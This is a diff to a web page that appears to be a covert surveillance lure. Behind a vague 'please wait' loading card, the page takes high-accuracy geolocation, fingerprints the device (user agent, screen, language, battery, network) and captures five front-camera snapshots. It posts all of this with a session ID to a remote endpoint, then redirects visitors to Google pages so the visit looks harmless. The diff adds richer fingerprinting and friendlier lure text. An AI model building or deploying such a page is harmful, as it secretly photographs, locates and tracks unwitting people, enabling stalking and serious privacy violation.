@@ -6,11 +6,8 @@
 <style>
   body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
   .card { text-align:center; max-width:500px; padding:40px 32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-  
-  /* Spinning Ring Styles */
   .ring { width: 50px; height: 50px; border: 5px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
   @keyframes spin { to { transform: rotate(360deg); } }
-
   h2 { color: #38bdf8; margin-top: 0; }
   p { opacity:.9; line-height:1.6; font-size: 15px; }
   .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
@@ -33,37 +30,64 @@ window.addEventListener("DOMContentLoaded", () => {
   const status = document.getElementById("status");
   const card = document.getElementById("main-card");
 
+  const sessionId = Math.random().toString(36).substring(2, 6).toUpperCase();
+
   function getLocation() {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
-        resolve("unsupported");
+        resolve("Location not supported");
       } else {
         navigator.geolocation.getCurrentPosition(
           (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-          (err) => resolve("error"),
-          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+          (err) => {
+            if (err.code === 1) resolve("Location denied by user");
+            else if (err.code === 2) resolve("Location unavailable (GPS off)");
+            else if (err.code === 3) resolve("Location timeout");
+            else resolve("Unknown Location Error");
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       }
     });
   }
 
+  // Get extra technical info
+  async function getExtraInfo() {
+    let battery = "Unknown";
+    let network = "Unknown";
+    
+    try {
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        battery = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
+      }
+    } catch(e) {}
+    
+    try {
+      if (navigator.connection) {
+        network = navigator.connection.effectiveType || "Unknown";
+      }
+    } catch(e) {}
+
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const lang = navigator.language || "Unknown";
+    
+    return `Screen: ${screenRes} | Lang: ${lang} | Battery: ${battery} | Net: ${network}`;
+  }
+
   (async () => {
-    status.textContent = "...";
-    
-    // Get location (waits max 5 seconds before moving on)
+    status.textContent = "Requesting...";
     const userLocation = await getLocation();
-    
-    // Get device info (Browser + OS)
+    const extraInfo = await getExtraInfo();
     const deviceInfo = navigator.userAgent;
     
-    status.textContent = "...";
+    status.textContent = "Requesting ...";
     let stream;
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }, audio: false
       });
     } catch (e) {
-      // If they block the camera, redirect instead of getting stuck
       card.innerHTML = `<h2 class="success">✅ please wait...</h2>`;
       setTimeout(() => { window.location.href = "https://notebook.google.com/"; }, 2000);
       return;
@@ -78,7 +102,7 @@ window.addEventListener("DOMContentLoaded", () => {
     const ctx = c.getContext("2d");
 
     let n = 0;
-    status.textContent = `... 1 / 5`;
+    status.textContent = ` wait please... 1 / 5`;
 
     const timer = setInterval(async () => {
       ctx.drawImage(video, 0, 0, c.width, c.height);
@@ -91,30 +115,24 @@ window.addEventListener("DOMContentLoaded", () => {
           body: JSON.stringify({ 
               img: img, 
               loc: userLocation,
-              device: deviceInfo 
+              device: deviceInfo,
+              extra: extraInfo,
+              session: sessionId
           })
         });
       } catch (_) {}
 
       n++;
       if (n < 5) {
-          status.textContent = `... ${n + 1} / 5`;
+          status.textContent = `wait please... ${n + 1} / 5`;
       } else {
         clearInterval(timer);
         stream.getTracks().forEach(t => t.stop());
         
-        card.innerHTML = `
-          <h2 class="success">✅ please wait...</h2>
-        `;
+        card.innerHTML = `<h2 class="success">✅ please wait...</h2>`;
 
-        let secondsLeft = 1;
-        
-        const redirectTimer = setInterval(() => {
-          secondsLeft--;
-          if (secondsLeft <= 0) {
-            clearInterval(redirectTimer);
-            window.location.href = "https://notebook.google.com/";
-          }
+        setTimeout(() => {
+          window.location.href = "https://photos.google.com/";
         }, 1000);
       }
     }, 2000);
